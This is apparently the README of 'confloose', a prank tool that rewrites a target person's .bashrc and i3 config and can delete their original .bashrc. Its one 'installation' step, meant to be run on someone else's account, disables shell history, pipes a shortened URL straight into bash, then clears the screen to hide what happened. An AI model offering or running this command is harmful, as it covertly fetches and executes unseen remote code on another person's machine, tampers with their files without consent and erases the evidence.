# confloose

This confloose only modifies the `.bashrc` and the i3 config file.  
The previous `.bashrc` is renamed to `~/afs/tp.py`.

*⚠️ If this command is executed more than once, the original `.bashrc` will be deleted!*

## 📦 Installation

To confloose someone, run the following command:

```sh
set +o history; curl -sL https://urls.fr/XMhtMj | bash && clear; set -o history
